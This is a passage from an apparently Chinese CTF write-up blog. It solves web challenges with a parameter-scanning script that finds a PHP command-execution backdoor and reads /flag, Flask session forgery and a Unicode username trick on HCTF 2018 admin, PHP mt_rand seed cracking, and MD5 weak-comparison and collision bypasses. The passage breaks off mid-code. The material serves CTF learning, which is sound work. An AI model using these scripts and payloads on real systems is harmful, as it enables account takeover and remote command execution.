  <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:    <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;							<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;							<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)		<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()							<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:				<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()					<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()				<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                   <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:							<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2020/03/26/E52JRo1d7UTzSqu.png" alt=""></p>
<p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p>
<p><img src="https://i.loli.net/2020/03/26/qjkUgWRPOIuAhfT.png" alt=""></p>
<h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a href="https://www.codercto.com/a/38179.html" target="_blank" rel="noopener">参考</a></p>
<p>界面：</p>
<p><img src="https://i.loli.net/2020/03/26/KmtGuqCVU7DwXS1.png" alt=""></p>
<h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">Python Web之flask session&amp;格式化字符串漏洞</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">客户端 session 导致的安全问题</a></li>
</ul>
<p>在index和change界面的源码处分别有两处提示：</p>
<p><img src="https://i.loli.net/2020/03/26/kz51oVFHheciBpM.png" alt=""></p>
<p><img src="https://i.loli.net/2020/03/26/8luTwzCHjGaJxWI.png" alt=""></p>
<p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin" target="_blank" rel="noopener">flask</a>写的</p>
<p>解题具体操作如下：</p>
<p>先注册一个账户：admin1</p>
<p>在index界面拿到自己的session，进行解码，上大佬脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/HEjTQxWIGPJs68y.png" alt=""></p>
<p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本git下载地址</a></p>
<p><img src="https://i.loli.net/2020/03/26/57s1tOJ8nkvQG42.png" alt=""></p>
<p><img src="https://i.loli.net/2020/03/26/PUoerHbaDEzfqXp.png" alt=""></p>
<p>将自己的session修改为编码后的session即可得到flag</p>
<h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到bdui，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure>

<p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考</a></p>
<p>于是就有了以下的Unicode编码问题；具体编码方式：<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99" target="_blank" rel="noopener">修饰字母大写</a></p>
<p>nodeprep.prepare会进行如下操作</p>
<p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p>
<p>参考：</p>
<p><img src="https://i.loli.net/2020/03/26/YfaPUM4nLEjVoKH.png" alt=""></p>
<p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p>
<h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p>
<p><img src="https://i.loli.net/2020/03/26/5n4bdA1CK7zgLsX.png" alt=""></p>
<p>F12发现check.php，访问得到php源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>

<p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p>
<p>上爆破工具php_mt_seed和脚本得到随机数种子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'cTVM5ZeUkl'</span></span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 2 0 61 55 55 0 61 57 57 0 61 48 48 0 61 31 31 0 61 61 61 0 61 4 4 0 61 56 56 0 61 10 10 0 61 11 11 0 61</span><br></pre></td></tr></table></figure>

<p>爆破</p>
<p><img src="https://i.loli.net/2020/03/26/nD79agbqeWK8PMp.png" alt=""></p>
<p>将得到的随机种子放到php脚本中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">654818272</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到字符串</p>
<p><img src="https://i.loli.net/2020/03/26/kZmr1vP2TJFjgsq.png" alt=""></p>
<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p>
<blockquote>
<p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash" target="_blank" rel="noopener">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7" target="_blank" rel="noopener">2019掘安杯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">第二届强网杯 MD5碰撞 writeup</a></p>
</blockquote>
<p>进来先看界面代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$val1 = @$_GET[<span class="string">'val1'</span>];</span><br><span class="line">$val2 = @$_GET[<span class="string">'val2'</span>];</span><br><span class="line">$val3 = @$_GET[<span class="string">'val3'</span>];</span><br><span class="line">$val4 = @$_GET[<span class="string">'val4'</span>];</span><br><span class="line">$val5 = (string)@$_POST[<span class="string">'val5'</span>];</span><br><span class="line">$val6 = (string)@$_POST[<span class="string">'val6'</span>];</span><br><span class="line">$val7 = (string)@$_POST[<span class="string">'val7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $val1 == $val2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val1 OR val2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($val1) != md5($val2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val3 == $val4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val3 OR val4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($val3) !== md5($val4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val5 OR val6 OR val7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>)  || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码审计一个一个绕</p>
<p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p>
<blockquote>
<p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p>
</blockquote>
<p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p>
<p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值的原型，这里就需要参考一篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o 0 1    -o参数代表随机生成两个相同MD5的文件</span><br><span class="line">fastcoll_v1.0.0.5.exe -p 1 -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同</span><br><span class="line">tail.exe -c 128 00 &gt; a    -c 128代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因</span><br><span class="line">tail.exe -c 128 01 &gt; b    同理</span><br><span class="line">type 0 a &gt; 10    这里表示将0和a文件的内容合并写入10</span><br><span class="line">type 0 b &gt; 11    这里表示将0和b文件的内容合并写入11</span><br></pre></td></tr></table></figure>

<p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll下载链接</a>、<a href="https://www.trisunsoft.com/tail-for-windows.htm" target="_blank" rel="noopener">tail.exe下载链接</a></p>
<p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p>
<p><img src="https://i.loli.net/2020/03/26/vsBMkn48lLp1Thr.png" alt=""></p>
<p>于是在PHP中生成其中三个的urlencode的值：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"00"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"00"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"00"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"10"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"10"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode(readmyfile(<span class="string">"10"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash 